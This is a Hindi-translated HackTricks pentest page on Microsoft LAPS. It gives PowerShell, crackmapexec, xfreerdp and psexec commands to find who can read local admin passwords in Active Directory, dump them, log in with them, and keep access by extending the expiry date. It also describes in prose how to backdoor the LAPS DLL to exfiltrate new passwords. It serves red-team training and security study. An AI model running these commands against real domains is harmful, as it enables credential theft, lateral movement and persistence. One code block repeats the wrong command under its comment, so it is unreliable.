# LAPS

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}


## Basic Information

Local Administrator Password Solution (LAPS) एक उपकरण है जिसका उपयोग एक प्रणाली का प्रबंधन करने के लिए किया जाता है जहाँ **व्यवस्थापक पासवर्ड**, जो **विशिष्ट, यादृच्छिक, और अक्सर बदले जाते हैं**, डोमेन से जुड़े कंप्यूटरों पर लागू होते हैं। ये पासवर्ड सक्रिय निर्देशिका में सुरक्षित रूप से संग्रहीत होते हैं और केवल उन उपयोगकर्ताओं के लिए उपलब्ध होते हैं जिन्हें एक्सेस कंट्रोल सूचियों (ACLs) के माध्यम से अनुमति दी गई है। क्लाइंट से सर्वर तक पासवर्ड ट्रांसमिशन की सुरक्षा **Kerberos संस्करण 5** और **Advanced Encryption Standard (AES)** के उपयोग द्वारा सुनिश्चित की जाती है।

डोमेन के कंप्यूटर ऑब्जेक्ट्स में, LAPS का कार्यान्वयन दो नए गुणों की वृद्धि का परिणाम होता है: **`ms-mcs-AdmPwd`** और **`ms-mcs-AdmPwdExpirationTime`**। ये गुण **सादा-टेक्स्ट व्यवस्थापक पासवर्ड** और **इसके समाप्ति समय** को क्रमशः संग्रहीत करते हैं।

### Check if activated
```bash
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
```
### LAPS पासवर्ड एक्सेस

आप **कच्ची LAPS नीति** को `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` से **डाउनलोड** कर सकते हैं और फिर **`Parse-PolFile`** का उपयोग [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) पैकेज से इस फ़ाइल को मानव-पठनीय प्रारूप में परिवर्तित करने के लिए किया जा सकता है।

इसके अलावा, **स्थानीय LAPS PowerShell cmdlets** का उपयोग किया जा सकता है यदि वे किसी मशीन पर स्थापित हैं जिस पर हमें पहुंच है:
```powershell
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
**PowerView** का उपयोग यह पता लगाने के लिए भी किया जा सकता है कि **कौन पासवर्ड पढ़ सकता है और इसे पढ़ सकता है**:
```powershell
# Find the principals that have ReadPropery on ms-Mcs-AdmPwd
Get-AdmPwdPassword -ComputerName wkstn-2 | fl

# Read the password
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
```
### LAPSToolkit

The [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) LAPS की गणना को कई कार्यों के साथ सरल बनाता है।\
एक है **`ExtendedRights`** को **LAPS सक्षम सभी कंप्यूटरों** के लिए पार्स करना। यह **समूहों** को दिखाएगा जो विशेष रूप से LAPS पासवर्ड पढ़ने के लिए **प्रतिनिधि** हैं, जो अक्सर संरक्षित समूहों में उपयोगकर्ता होते हैं।\
एक **खाता** जो **कंप्यूटर** को एक डोमेन में शामिल करता है, उस होस्ट पर `All Extended Rights` प्राप्त करता है, और यह अधिकार **खाते** को **पासवर्ड पढ़ने** की क्षमता देता है। गणना एक उपयोगकर्ता खाते को दिखा सकती है जो एक होस्ट पर LAPS पासवर्ड पढ़ सकता है। यह हमें **विशिष्ट AD उपयोगकर्ताओं** को लक्षित करने में मदद कर सकता है जो LAPS पासवर्ड पढ़ सकते हैं।
```powershell
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expirations time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## **Dumping LAPS Passwords With Crackmapexec**
यदि पावरशेल तक पहुँच नहीं है, तो आप LDAP के माध्यम से इस विशेषाधिकार का दूरस्थ रूप से दुरुपयोग कर सकते हैं।
```
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
```
यह सभी पासवर्ड को डंप करेगा जिन्हें उपयोगकर्ता पढ़ सकता है, जिससे आपको एक अलग उपयोगकर्ता के साथ बेहतर स्थिति प्राप्त करने की अनुमति मिलेगी।

## ** LAPS पासवर्ड का उपयोग करना **
```
xfreerdp /v:192.168.1.1:3389  /u:Administrator
Password: 2Z@Ae)7!{9#Cq

python psexec.py Administrator@web.example.com
Password: 2Z@Ae)7!{9#Cq
```
## **LAPS स्थायीकरण**

### **समाप्ति तिथि**

एक बार जब आप व्यवस्थापक बन जाते हैं, तो **पासवर्ड प्राप्त करना** और एक मशीन को इसके **पासवर्ड को अपडेट करने से रोकना** संभव है **समाप्ति तिथि को भविष्य में सेट करके**।
```powershell
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## It's needed SYSTEM on the computer
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
{% hint style="warning" %}
यदि कोई **admin** **`Reset-AdmPwdPassword`** cmdlet का उपयोग करता है; या यदि LAPS GPO में **Do not allow password expiration time longer than required by policy** सक्षम है, तो पासवर्ड अभी भी रीसेट हो जाएगा।
{% endhint %}

### बैकडोर

LAPS का मूल स्रोत कोड [यहां](https://github.com/GreyCorbel/admpwd) पाया जा सकता है, इसलिए कोड में एक बैकडोर डालना संभव है (उदाहरण के लिए `Main/AdmPwd.PS/Main.cs` में `Get-AdmPwdPassword` विधि के अंदर) जो किसी न किसी तरह **नए पासवर्ड को एक्सफिल्ट्रेट या कहीं स्टोर** करेगा।

फिर, बस नए `AdmPwd.PS.dll` को संकलित करें और इसे मशीन में `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` पर अपलोड करें (और संशोधन समय बदलें)।

## संदर्भ
* [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
AWS हैकिंग सीखें और अभ्यास करें:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP हैकिंग सीखें और अभ्यास करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks का समर्थन करें</summary>

* [**सदस्यता योजनाओं**](https://github.com/sponsors/carlospolop) की जांच करें!
* **हमारे** 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**telegram समूह**](https://t.me/peass) में शामिल हों या **Twitter** 🐦 पर हमें **फॉलो** करें [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **हैकिंग ट्रिक्स साझा करें और** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) गिटहब रिपोजिटरी में PR सबमिट करें।

</details>
{% endhint %}
